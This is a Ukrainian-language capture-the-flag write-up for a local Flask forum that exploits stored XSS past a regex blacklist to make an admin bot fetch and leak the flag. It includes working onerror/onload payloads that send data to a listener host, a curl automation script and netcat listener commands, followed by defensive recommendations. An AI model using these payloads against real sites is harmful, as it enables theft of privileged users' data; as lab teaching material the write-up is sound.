# Writeup — NullByte Forum (stored XSS + admin bot)

Флаг: `CTF{st0r3d_x55_1n_4dm1n_b07}`

---

## 0. Що дано

- Форум на Flask: <http://localhost:5000>
- Можна створювати пости без реєстрації.
- Є кнопка «Поскаржитись модератору»: вона ставить пост у чергу, і
  headless-Chromium **під адмінською сесією** відкриває цей пост.
- Флаг лежить в адмінці (`/admin`, `/admin/flag`).
- Пароль адміна випадковий, cookie сесії `HttpOnly`.

Мета: виконати свій JavaScript у браузері бота й викрасти флаг.

---

## 1. Розвідка

Відкриваємо головну:

```bash
curl -s http://localhost:5000/ | head -n 40
```

Бачимо форум і форму створення поста. Перевіряємо, чи екранується HTML:

1. Створюємо пост із текстом `<b>hello</b>`.
2. Відкриваємо пост — текст стає **жирним**.

Отже, HTML не екранується. Дивимось у вихідний код шаблону
`templates/post.html`:

```jinja
<div class="post-body">{{ post.body | safe }}</div>
```

`|safe` вимикає autoescape — це і є точка входу для stored XSS.

Перевіряємо адмінку без сесії:

```bash
curl -i http://localhost:5000/admin
# HTTP/1.1 403 FORBIDDEN

curl -i http://localhost:5000/admin/flag
# HTTP/1.1 403 FORBIDDEN
```

Пароль не світиться ніде в HTML, cookie `HttpOnly`, тому
`document.cookie` теж не дасть сесію. Потрібен саме XSS-запит **від імені
сторінки**.

---

## 2. Аналіз фільтра

У `app.py`:

```python
_SCRIPT_BLOCK = re.compile(r"<\s*script\b[^>]*>.*?<\s*/\s*script\s*>", re.I | re.S)
_SCRIPT_TAG = re.compile(r"<\s*/?\s*script\b[^>]*>", re.I)
_JS_URI = re.compile(r"javascript\s*:", re.I)

def sanitize_body(text):
    text = _SCRIPT_BLOCK.sub("", text)
    text = _SCRIPT_TAG.sub("", text)
    text = _JS_URI.sub("", text)
    return text[:2000]
```

Це blacklist:

- `<script>alert(1)</script>` — **не спрацює**, тег виріже.
- `javascript:alert(1)` — теж виріже.
- Але `<img src=x onerror=...>` фільтр не чіпає: обробники подій
  залишаються.

Перевірка:

```html
<img src=x onerror=alert(document.domain)>
```

Публікуємо, відкриваємо пост — браузер показує alert. XSS підтверджено.
(Бот автоматично закриває діалоги, тому `alert` — лише для самоперевірки.)

Інші робочі вектори:

```html
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="/admin" onload="...">
```

---

## 3. Готуємо listener

Флаг треба якось забрати з браузера бота. Найпростіше — HTTP-listener на
своїй машині (Kali або Windows).

### Варіант А: готовий listener

```bash
cd xss-ctf
python3 solve/listener.py
# [*] Слухаю http://0.0.0.0:8000
```

Він логує всі GET/POST, декодує query-параметри й підсвічує `CTF{...}`.

### Варіант Б: стандартний HTTP-сервер

```bash
python3 -m http.server 8000
```

Флаг з'явиться прямо в access-лозі у URL-encoded вигляді:

```
GET /leak?f=CTF%7Bst0r3d_x55_1n_4dm1n_b07%7D
```

`%7B` / `%7D` — це `{` / `}`. Можна декодувати будь-яким URL-decoder.

### Варіант В: netcat (Kali)

```bash
nc -lvnp 8000
```

Побачиш сирий HTTP-запит:

```
GET /leak?f=CTF%7B...%7D HTTP/1.1
Host: host.docker.internal:8000
...
```

---

## 4. Payload

Логіка:

1. Виконатись на сторінці поста під адміном.
2. `fetch('/admin/flag')` — same-origin, тому відповідь читається.
3. Відправити флаг на listener через `new Image().src = ...`
   (image-beacon не потребує CORS і не блокується).

### Для Docker

Бот у контейнері, listener — на хості, тому `host.docker.internal`:

```html
<img src=x onerror="fetch('/admin/flag').then(r=>r.json()).then(d=>{new Image().src='http://host.docker.internal:8000/leak?f='+encodeURIComponent(d.flag)})">
```

### Для локального Python-запуску

```html
<img src=x onerror="fetch('/admin/flag').then(r=>r.json()).then(d=>{new Image().src='http://127.0.0.1:8000/leak?f='+encodeURIComponent(d.flag)})">
```

### Альтернатива: читаємо HTML адмінки

```html
<img src=x onerror="fetch('/admin').then(r=>r.text()).then(t=>{new Image().src='http://host.docker.internal:8000/leak?f='+encodeURIComponent(t.match(/CTF\{[^}]+\}/)[0])})">
```

### Альтернатива: same-origin iframe

```html
<iframe src="/admin" onload="new Image().src='http://host.docker.internal:8000/leak?f='+encodeURIComponent(this.contentDocument.body.innerText.match(/CTF\{[^}]+\}/)[0])"></iframe>
```

Усі варіанти експлуатують одну й ту саму вразливість.

---

## 5. Експлуатація через браузер

1. Запусти listener:
   ```bash
   python3 solve/listener.py
   ```
2. Відкрий <http://localhost:5000/new>.
3. Заповни:
   - Ім'я: `pentester`
   - Заголовок: `xss`
   - Текст: payload з розділу 4.
4. Натисни «Опублікувати».
5. На сторінці поста натисни **«Поскаржитись модератору»**.
6. Зачекай 5–15 секунд. У терміналі listener:

```
[12:34:56] GET /leak?f=CTF%7Bst0r3d_x55_1n_4dm1n_b07%7D
    from: 172.18.0.2:54321
    f = CTF{st0r3d_x55_1n_4dm1n_b07}

============================================================
  FLAG: CTF{st0r3d_x55_1n_4dm1n_b07}
============================================================
```

Готово.

---

## 6. Експлуатація через curl (Kali)

```bash
BASE=http://localhost:5000

# Payload у подвійних лапках, всередині — одинарні.
PAYLOAD="<img src=x onerror=\"fetch('/admin/flag').then(r=>r.json()).then(d=>{new Image().src='http://host.docker.internal:8000/leak?f='+encodeURIComponent(d.flag)})\">"

# 1) створити пост; отримати Location: /post/N
LOC=$(curl -s -o /dev/null -w '%{redirect_url}' -X POST "$BASE/new" \
  --data-urlencode 'author=pentester' \
  --data-urlencode 'title=xss' \
  --data-urlencode "body=$PAYLOAD")

echo "$LOC"                 # http://localhost:5000/post/1
POST_ID=${LOC##*/}

# 2) смикнути бота
curl -s -o /dev/null -X POST "$BASE/report/$POST_ID"

# 3) дивитись listener
```

Якщо у тебе PowerShell, замість `$VAR` використовуй `$env:VAR` / окремі
виклики, або просто запусти `python solve/solve.py`.

---

## 7. Автоматичний солвер

```bash
# Docker
python3 solve/solve.py --exfil-host host.docker.internal

# локальний Python
python3 solve/solve.py --exfil-host 127.0.0.1
```

Скрипт сам:

1. піднімає listener на `0.0.0.0:8000`;
2. створює пост із payload;
3. витягує `post_id` з redirect;
4. викликає `/report/<id>`;
5. чекає флаг і друкує його.

---

## 8. Чому це працює

Ланцюжок:

1. **Stored XSS** — тіло поста зберігається в БД і рендериться через
   `|safe` без екранування.
2. **Слабкий фільтр** — видаляє лише `<script>`/`javascript:`, але не
   inline-обробники (`onerror`, `onload`, `ontoggle`).
3. **Бот із привілеями** — адмін-бот має активну сесію й відкриває
   недовірений пост.
4. **Same-origin fetch** — payload виконується на `localhost:5000`, тому
   `fetch('/admin/flag')` повертає флаг.
5. **Exfiltration** — `new Image().src` відправляє дані на зовнішній
   listener; CORS не заважає, бо це не читання відповіді, а вихідний запит.

Cookie сесії `HttpOnly` заважає вкрасти її напряму, але не заважає
виконувати запити **від імені** сесії, поки сторінка відкрита.

---

## 9. Як захищатися (реальний світ)

- Не використовувати `|safe` для користувацького вводу; екранувати все.
- Sanitize HTML бібліотекою (bleach, DOMPurify) з allowlist-тегів та
  атрибутів, а не blacklist-регексами.
- Додати CSP (`script-src 'self'` без `unsafe-inline`) — inline `onerror`
  не виконається.
- Cookie: `HttpOnly`, `Secure`, `SameSite=Strict`.
- Адмін-бот має ходити в ізольованому середовищі без доступу до
  внутрішніх ресурсів, бажано з окремою сесією та allowlist URL.
- Не рендерити чужі пости в контексті адмінки.

---

## 10. Траблшутинг

| Симптом | Що робити |
|---|---|
| `/healthz` показує `"bot":false` | встанови Playwright + Chromium (`playwright install chromium`) або запусти Docker |
| Скарга не приймається | cooldown 10 с на IP, зачекай |
| Флаг не приходить | перевір `docker compose logs -f web`; переконайся, що listener слухає `0.0.0.0`, а не `127.0.0.1` |
| Docker не бачить listener | використовуй `host.docker.internal`; у compose вже є `extra_hosts: host-gateway` |
| Kali у VM, Docker на іншому хості | вкажи LAN-IP Kali замість `host.docker.internal`, відкрий порт 8000 |
| Порт 8000 зайнятий | `python3 solve/listener.py --port 9000` і зміни порт у payload |
| Хочу скинути БД | `docker compose down -v` або видали `data/forum.db` |

---

## 11. Для організатора

- Зміни флаг: `CTF_FLAG='CTF{...}' docker compose up --build`.
- Не публікуй `solve/`, `WRITEUP.md` і цей README гравцям.
- Прибери дефолтний флаг із `app.py` / `docker-compose.yml` у продакшн-версії.
- Обмеж бота allowlist-ом (зараз він ходить лише на `/post/<id>` — це вже
  зроблено в `/report`), не давай йому доступ до внутрішньої мережі.
- Тримай контейнер в окремій мережі, без зайвих портів назовні.
